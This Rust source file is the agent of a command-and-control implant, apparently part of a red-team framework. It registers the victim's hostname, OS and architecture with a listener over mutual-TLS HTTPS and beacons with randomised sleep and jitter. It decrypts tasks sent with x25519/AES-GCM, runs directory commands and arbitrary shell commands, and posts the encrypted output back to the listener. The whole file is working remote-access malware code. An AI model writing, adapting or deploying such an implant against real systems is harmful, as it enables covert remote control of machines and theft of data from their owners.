use reqwest::header::{HeaderMap, USER_AGENT};
use std::{
    fs,
    io::{self, Error},
    process::Command,
    thread,
};
use log::info;
// use x25519_dalek::{PublicKey, StaticSecret};
use x25519_dalek::{EphemeralSecret, PublicKey, SharedSecret, StaticSecret};
use crate::{
    core::{
        postdata::{CipherData, PlainData, RegisterAgentData},
        tasks::macos::shell::shell
    },
    Config,
    crypto::aesgcm::{decipher, EncMessage},
    utils::random::{random_name, random_sleeptime},
};

pub async fn run(config: Config) -> Result<(), Error> {
    let agent_name = random_name("agent".to_owned());
    let hostname = match Command::new("hostname").output() {
        Ok(h) => String::from_utf8(h.stdout).unwrap().trim().to_string(),
        _ => String::from("unknown"),
    };
    let os = std::env::consts::OS.to_string();
    let arch = std::env::consts::ARCH.to_string();
    let listener_url = format!(
        "{}://{}:{}/",
        config.listener.proto,
        config.listener.host,
        config.listener.port
    );

    let rad = RegisterAgentData::new(
        agent_name.clone(),
        hostname,
        os,
        arch,
        listener_url.clone(),
        config.my_public_key,
    );
    let root_cert = reqwest::Certificate::from_pem(config.listener.https_root_cert.as_bytes()).unwrap();
    let client_certs = [config.listener.https_client_cert, config.listener.https_client_key].concat();
    let client_id = reqwest::Identity::from_pem(client_certs.as_bytes()).unwrap();

    let client = reqwest::Client::builder()
        .use_rustls_tls()
        .identity(client_id)
        .add_root_certificate(root_cert)
        .build()
        .unwrap();

    let mut headers = HeaderMap::new();
    headers.insert(USER_AGENT, config.listener.user_agent.parse().unwrap());

    let mut registered = false;
    while !registered {
        thread::sleep(
            random_sleeptime(config.sleep.to_owned(), config.jitter.to_owned())
        );
        let response = match client
            .post(format!("{}{}", listener_url.to_string(), "r"))
            .headers(headers.clone())
            .json(&rad)
            .send()
            .await
        {
            Ok(resp) => {
                registered = true;
                let _ = resp.text().await.unwrap();
            }
            Err(e) => {
                info!("Registration request failed: {:?}", e);
                continue;
            }
        };
    }
    let plaindata = PlainData::new(agent_name.to_string(), "".to_string());

    loop {
        thread::sleep(
            random_sleeptime(config.sleep.to_owned(), config.jitter.to_owned())
        );

        let task_url = format!("{}t/a", listener_url);
        let task = match client
            .post(task_url)
            .headers(headers.clone())
            .json(&plaindata)
            .send()
            .await
        {
            Ok(resp) => {
                let resp = resp.text().await.unwrap();
                if resp.is_empty() {
                    continue;
                }
                let cipherdata: CipherData = serde_json::from_str(&resp).unwrap();
                let deciphered_task = decipher(
                    EncMessage {
                        ciphertext: cipherdata.c,
                        nonce: cipherdata.n,
                    },
                    config.my_secret_key.clone(),
                    config.server_public_key.clone(),
                );
                String::from_utf8(deciphered_task).unwrap()
            }
            Err(e) => {
                info!("Task request failed: {:?}", e);
                continue;
            }
        };

        let task_args = match shellwords::split(&task) {
            Ok(args) => args,
            Err(_) => continue,
        };
        if task_args.is_empty() {
            continue;
        }

        match task_args[0].as_str() {
            "cd" => {
                let result = std::env::set_current_dir(task_args[1].as_str());
                let result_data = match result {
                    Ok(_) => b"The current directory changed successfully.".to_vec(),
                    Err(e) => e.to_string().into_bytes(),
                };
                post_task_result(
                    &result_data,
                    agent_name.clone(),
                    listener_url.clone(),
                    headers.clone(),
                    config.my_secret_key.clone(),
                    config.server_public_key.clone(),
                    &client,
                )
                    .await;
            }
            "ls" => {
                let result = fs::read_dir(task_args[1].as_str());
                let output = match result {
                    Ok(entries) => {
                        let mut s = String::new();
                        for path in entries {
                            if let Ok(entry) = path {
                                let name = entry.path().to_string_lossy().rsplit('/').next().unwrap().to_string();
                                match entry.metadata() {
                                    Ok(meta) => s += &format!("{:<20} {}\n", name, meta.len()),
                                    Err(_) => s += &format!("{}\n", name),
                                }
                            }
                        }
                        s
                    }
                    Err(e) => e.to_string(),
                };
                post_task_result(
                    &*output.as_bytes().to_vec(),
                    agent_name.clone(),
                    listener_url.clone(),
                    headers.clone(),
                    config.my_secret_key.clone(),
                    config.server_public_key.clone(),
                    &client,
                )
                    .await;
            }
            "pwd" => {
                let result = std::env::current_dir();
                let result_data = match result {
                    Ok(path) => path.to_str().unwrap().to_string().into_bytes(),
                    Err(e) => e.to_string().into_bytes(),
                };
                post_task_result(
                    &result_data,
                    agent_name.clone(),
                    listener_url.clone(),
                    headers.clone(),
                    config.my_secret_key.clone(),
                    config.server_public_key.clone(),
                    &client,
                )
                    .await;
            }
            "shell" => {
                match shell(task_args[1..].join(" ")).await {
                    Ok(result) => {
                        post_task_result(
                            &result,
                            agent_name.clone(),
                            listener_url.clone(),
                            headers.clone(),
                            config.my_secret_key.clone(),
                            config.server_public_key.clone(),
                            &client,
                        )
                            .await;
                    }
                    Err(e) => {
                        post_task_result(
                            e.to_string().as_bytes(),
                            agent_name.clone(),
                            listener_url.clone(),
                            headers.clone(),
                            config.my_secret_key.clone(),
                            config.server_public_key.clone(),
                            &client,
                        )
                            .await;
                    }
                }
            }
            _ => continue,
        }
    }
}

async fn post_task_result(
    plaindata: &[u8],
    agent_name: String,
    listener_url: String,
    headers: HeaderMap,
    my_secret_key: StaticSecret,
    server_public_key: PublicKey,
    client: &reqwest::Client,
) {
    let cipherdata = CipherData::new(
        agent_name,
        plaindata,
        my_secret_key,
        server_public_key,
    );

    let _ = client
        .post(format!("{}t/r", listener_url))
        .headers(headers)
        .json(&cipherdata)
        .send()
        .await;
}
